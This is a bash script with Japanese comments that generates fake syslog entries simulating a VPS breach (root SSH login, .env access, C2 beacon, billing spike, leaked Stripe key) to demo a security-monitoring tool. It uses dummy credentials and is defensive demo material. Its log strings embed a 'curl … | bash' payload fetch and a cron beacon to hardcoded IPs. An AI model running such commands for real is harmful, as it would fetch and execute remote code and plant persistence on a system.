#!/bin/bash
# ============================================================
# NekoGuard Demo - Fake Incident Generator
# VPS 侵害シナリオをログとして再現するスクリプト
#
# 使い方:
#   chmod +x fake_incident.sh
#   sudo ./fake_incident.sh [active|past]
#
# active (default): 現在進行形の侵害 → CAT Protocol 発動
# past:             過去の侵害       → ABC Protocol 発動
# ============================================================

SCENARIO=${1:-active}
ATTACKER_IP="185.220.101.42"
C2_IP="45.142.212.100"
DEPLOY_USER="deploy"
ENV_FILE="/home/${DEPLOY_USER}/.env"

RED='\033[0;31m'
YEL='\033[1;33m'
GRN='\033[0;32m'
NC='\033[0m'

echo -e "${YEL}[NekoGuard Demo] シナリオ: ${SCENARIO} breach を開始するニャ...${NC}"
echo ""

# ---- ダミー .env ファイルを作成 ----
setup_env_file() {
    mkdir -p "/home/${DEPLOY_USER}"
    cat > "${ENV_FILE}" << 'ENVEOF'
# NekoGuard Demo - Dummy credentials (全部フェイクです)
GCP_API_KEY=AIzaSyDUMMY_FAKE_KEY_FOR_DEMO_xQ2
STRIPE_SECRET_KEY=sk_live_DUMMY_FAKE_KEY_FOR_DEMO_mK9
GITHUB_TOKEN=ghp_DUMMY_FAKE_TOKEN_FOR_DEMO_mK9
DATABASE_URL=postgresql://user:DUMMY_PASS@localhost/prod
JWT_SECRET=dummy_jwt_secret_for_nekoguard_demo_only
ENVEOF
    chmod 600 "${ENV_FILE}"
    echo -e "${GRN}[+] ダミー .env を設置しました: ${ENV_FILE}${NC}"
}

# ---- Active Breach シナリオ ----
scenario_active() {
    echo -e "${RED}[!] Active Breach シナリオを実行中...${NC}"
    sleep 1

    # 1. 不審な root SSH ログイン
    logger -p auth.warning -t sshd \
        "Accepted publickey for root from ${ATTACKER_IP} port 51234 ssh2"
    echo -e "${RED}[+] SSH ログイン偽装ログを記録${NC}"
    sleep 1

    # 2. .env ファイルへのアクセス
    cat "${ENV_FILE}" > /dev/null 2>&1
    logger -p local6.warning -t nekoguard-demo \
        "CREDENTIAL_ACCESS: .env read by unknown process (pid $$, parent: bash) user=root"
    echo -e "${RED}[+] .env アクセスログを記録${NC}"
    sleep 1

    # 3. 不審なコマンド実行（実際には何もしない）
    logger -p syslog.err -t nekoguard-demo \
        "EXECUTION: curl https://${ATTACKER_IP}/payload.sh | bash executed as root (simulated)"
    echo -e "${RED}[+] curl|bash 実行ログを記録${NC}"
    sleep 1

    # 4. バックドア cron ジョブ追加
    logger -p cron.warning -t nekoguard-demo \
        "PERSISTENCE: New cron job added to /etc/cron.d/update: */5 * * * * curl http://${C2_IP}/beacon"
    echo -e "${RED}[+] 不審な cron ジョブログを記録${NC}"
    sleep 1

    # 5. 課金スパイク
    logger -p local0.err -t nekoguard-demo \
        "BILLING_SPIKE: GCP API usage anomaly detected: 14800 requests in 15min (normal: ~1200/day) from compromised credentials"
    echo -e "${RED}[+] 課金スパイクログを記録${NC}"
    sleep 1

    # 6. C2 通信
    logger -p local0.warning -t nekoguard-demo \
        "NETWORK: Outbound connection to known C2 server: ${C2_IP}:443 (beacon)"
    echo -e "${RED}[+] C2 通信ログを記録${NC}"
}

# ---- Past Breach シナリオ ----
scenario_past() {
    echo -e "${YEL}[!] Past Breach シナリオを実行中...${NC}"
    sleep 1

    # 1. 古い SSH セッション（6時間前扱い）
    logger -p auth.warning -t sshd \
        "Accepted password for ${DEPLOY_USER} from 91.108.56.130 port 44821 ssh2"
    sleep 1
    logger -p auth.info -t sshd \
        "Disconnected from user ${DEPLOY_USER} 91.108.56.130 port 44821"
    echo -e "${YEL}[+] 過去の SSH セッションログを記録${NC}"
    sleep 1

    # 2. git clone（情報窃取）
    logger -p audit.warning -t nekoguard-demo \
        "DATA_EXFIL: git clone of private repository executed during unauthorized session"
    echo -e "${YEL}[+] git clone ログを記録${NC}"
    sleep 1

    # 3. GitHub シークレット漏洩
    logger -p local0.critical -t nekoguard-demo \
        "CREDENTIAL_EXPOSURE: STRIPE_SECRET_KEY found in public GitHub commit abc1234 (pushed 3 days ago)"
    echo -e "${YEL}[+] 認証情報漏洩ログを記録${NC}"
    sleep 1

    # 4. Stripe から不審な利用通知
    logger -p local0.warning -t nekoguard-demo \
        "CREDENTIAL_ABUSE: Stripe API unusual activity from unknown IP — account under review"
    echo -e "${YEL}[+] Stripe 不審利用ログを記録${NC}"
}

# ---- クリーンアップ ----
cleanup() {
    echo ""
    echo -e "${GRN}[NekoGuard Demo] クリーンアップ中...${NC}"
    rm -f "${ENV_FILE}"
    echo -e "${GRN}[+] ダミー .env を削除しました${NC}"
    echo -e "${GRN}[完了] デモ用ログの生成が完了しました🐾${NC}"
}

# ---- メイン ----
setup_env_file

case "${SCENARIO}" in
    active)
        scenario_active
        ;;
    past)
        scenario_past
        ;;
    *)
        echo "使い方: $0 [active|past]"
        exit 1
        ;;
esac

echo ""
echo -e "${GRN}[✓] ログ生成完了！Dynatrace に反映されるまで1〜2分待ってニャ🐱${NC}"
echo -e "${GRN}[✓] その後 NekoGuard でログを解析してニャ${NC}"

# トラップでクリーンアップ（Ctrl+C でも動く）
trap cleanup EXIT
